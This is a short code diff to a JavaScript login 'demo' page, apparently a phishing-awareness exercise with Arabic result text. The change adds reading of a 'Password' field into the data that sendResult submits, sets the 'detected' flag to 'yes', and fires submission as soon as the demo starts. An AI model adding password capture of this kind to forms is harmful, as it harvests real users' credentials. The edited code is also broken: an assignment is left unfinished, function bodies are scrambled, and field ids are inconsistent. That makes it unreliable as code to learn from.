@@ -124,15 +124,19 @@ function sendResult(action){
     const email =
     document.getElementById("email")?.value || "";
 
+      const Password =
+    document.getElementById("Password")?.value || "";
     const data = {
 
         name:name,
 
         email:email,
 
+        Password:Password,
+        
         action:action,
 
-        detected:"No"
+        detected:"yes"
 
     };
 
@@ -157,13 +161,8 @@ function startDemo(){
 
     document.getElementById("login")
     .style.display="block";
-
-}
-
-
-function finishDemo(){
-
-    sendResult("submitted_demo_form");
+    
+ sendResult("submitted_demo_form");
 
     document.getElementById("password")
     .value="";
@@ -175,6 +174,10 @@ function finishDemo(){
 
     document.getElementById("result")
     .innerHTML=
+}
+
+
+function finishDemo(){
 
     "<b>.</b><br><br>" +
     "تم تسجيل نتيجة .<br>" +
